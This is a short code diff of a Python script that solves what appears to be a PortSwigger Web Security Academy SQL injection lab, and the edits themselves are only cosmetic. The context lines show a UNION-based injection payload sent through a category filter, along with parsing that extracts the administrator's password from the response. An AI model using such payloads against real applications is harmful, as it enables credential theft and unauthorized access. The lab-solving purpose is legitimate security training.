@@ -41,14 +41,14 @@ def get_column_names(url, session, users_table):
 
 def get_admin_password(url, session, users_table, username_column, password_column):
     response = session.get(f"{url}/filter?category=' UNION select {username_column}, {password_column} from {users_table}--")
-    soup = BeautifulSoup(response.text, 'html.parser')
-    admin_password = soup.find(string="administrator").parent.findNext('td').contents[0]
+    soup = BeautifulSoup(response.text, "html.parser")
+    admin_password = soup.find(string="administrator").parent.findNext("td").contents[0]
     return admin_password
 
 
 def main():
     if len(sys.argv) != 2:
-        print(f"(+) Usage: python3 {sys.argv[0]} <url>")
+        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
         print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
         sys.exit(1)
 
